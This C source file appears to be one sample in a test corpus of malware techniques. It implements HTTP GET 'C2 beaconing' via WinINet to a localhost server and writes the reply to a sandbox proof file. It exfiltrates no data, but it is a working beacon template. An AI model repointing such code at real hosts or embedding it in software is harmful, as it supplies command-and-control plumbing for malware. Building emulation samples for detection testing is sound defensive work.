// SAMPLE: g6_01 | HTTPGetWinINet | Group: C2 Network & Exfiltration
// Technique: HTTP GET Beaconing via WinINet
// Compile: x86_64-w64-mingw32-gcc -O2 -o g6_01_http_get_wininet.exe g6_01_http_get_wininet.c -lwininet
// PROOF WRITTEN FROM RAW SERVER RESPONSE — no client-side signature logic

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "wininet.lib")

#define C2_HOST        "127.0.0.1"
#define C2_PORT        8002
#define C2_PATH        "/beacon"
#define PROOF_PATH     "C:\\C1_Sandbox\\c1_proof.txt"
#define RECV_BUF_SIZE  4096

int main(void) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect  = NULL;
    HINTERNET hRequest  = NULL;
    char      recvBuf[RECV_BUF_SIZE];
    DWORD     bytesRead = 0;
    int       ret       = EXIT_FAILURE;

    /* Open WinINet session */
    hInternet = InternetOpenA(
        "C1Beacon/1.0",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL, 0);
    if (!hInternet) {
        fprintf(stderr, "[g6_01] InternetOpenA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Connect to C2 server */
    hConnect = InternetConnectA(
        hInternet,
        C2_HOST,
        (INTERNET_PORT)C2_PORT,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0);
    if (!hConnect) {
        fprintf(stderr, "[g6_01] InternetConnectA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Open GET request */
    hRequest = HttpOpenRequestA(
        hConnect,
        "GET",
        C2_PATH,
        NULL, NULL, NULL,
        0, 0);
    if (!hRequest) {
        fprintf(stderr, "[g6_01] HttpOpenRequestA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Send request */
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        fprintf(stderr, "[g6_01] HttpSendRequestA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Read response body */
    if (!InternetReadFile(hRequest, recvBuf, sizeof(recvBuf) - 1, &bytesRead)) {
        fprintf(stderr, "[g6_01] InternetReadFile failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (bytesRead == 0) {
        fprintf(stderr, "[g6_01] Empty response from C2 server — no proof written\n");
        goto cleanup;
    }

    /* Write raw server response directly to proof file — no formatting logic */
    HANDLE hProof = CreateFileA(
        PROOF_PATH,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hProof == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[g6_01] CreateFileA proof failed: %lu\n", GetLastError());
        goto cleanup;
    }
    DWORD written = 0;
    WriteFile(hProof, recvBuf, (DWORD)bytesRead, &written, NULL);
    CloseHandle(hProof);

    printf("[g6_01] Beacon sent; %lu bytes received; proof written to %s\n",
           bytesRead, PROOF_PATH);
    ret = EXIT_SUCCESS;

cleanup:
    if (hRequest)  InternetCloseHandle(hRequest);
    if (hConnect)  InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return ret;
}
